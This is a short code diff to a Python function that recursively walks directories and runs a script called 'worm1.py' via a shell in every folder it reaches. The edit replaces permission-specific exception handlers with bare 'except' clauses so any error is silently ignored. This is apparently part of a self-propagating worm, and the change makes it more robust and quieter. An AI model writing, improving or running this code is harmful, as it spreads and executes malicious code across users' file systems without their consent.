@@ -31,7 +31,7 @@ def traverse(path):
         
         run = Popen(("worm1.py"), shell=True, cwd=ospath.realpath(path))
         
-    except PermissionError:
+    except:
         pass
         
     with scandir(path) as scanner:
@@ -43,7 +43,7 @@ def traverse(path):
                     try:      
                         traverse(entry.path)
                 
-                    except PermissionError:
+                    except:
                         continue
     return
 
